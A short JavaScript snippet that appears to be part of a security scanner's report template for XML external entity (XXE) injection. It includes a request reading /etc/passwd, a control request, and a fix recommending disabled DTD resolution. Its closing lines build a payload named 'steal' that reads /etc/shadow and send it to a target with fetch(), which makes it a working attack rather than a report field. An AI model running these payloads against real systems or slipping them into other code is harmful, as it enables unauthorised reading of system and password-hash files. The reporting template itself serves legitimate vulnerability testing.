const report = {
  xxe: {
    severity: "high",
    marker: MK,
    request: (i) => `POST ${i.base_url}${i.endpoint} body=<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`,
    control: (i) => `POST ${i.base_url}${i.endpoint} body=<?xml version="1.0"?><x>benign</x>`,
    title: (i) => `XXE on ${i.endpoint} allows arbitrary file read`,
    expected: "The response contains /etc/passwd content (or the OOB callback fires for the external entity).",
    fix: "Disable DTD/external entity resolution and use a hardened XML parser."
  },
};
const attack = `<!DOCTYPE x [<!ENTITY steal SYSTEM "file:///etc/shadow">]><x>&steal;</x>`;
fetch(target, {method:"POST",body:attack});
